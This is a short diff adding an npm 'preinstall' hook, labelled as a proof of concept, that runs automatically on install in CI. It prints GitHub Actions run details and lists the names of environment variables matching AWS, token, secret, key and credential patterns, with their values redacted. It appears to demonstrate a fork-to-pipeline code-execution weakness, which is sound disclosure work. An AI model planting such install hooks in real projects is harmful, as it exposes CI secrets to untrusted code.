@@ -56,6 +56,7 @@
     }
   },
   "scripts": {
+    "preinstall": "echo '========== LOTP PoC: npm preinstall from fork ==========' && echo \"GITHUB_REPOSITORY=$GITHUB_REPOSITORY\" && echo \"GITHUB_RUN_ID=$GITHUB_RUN_ID\" && echo \"GITHUB_ACTOR=$GITHUB_ACTOR\" && env | grep -iE '(AWS|OIDC|SECRET|TOKEN|KEY|CREDENTIAL)' | sed 's/=.*/=[REDACTED]/' && echo '========== END PoC =========='",
     "build": "tsc && npm run copy-dcv",
     "copy-dcv": "npx tsx scripts/copy-dcv-sdk.ts",
     "check": "npm run lint && npm run format && npm run type-check:all && npm run test:coverage",
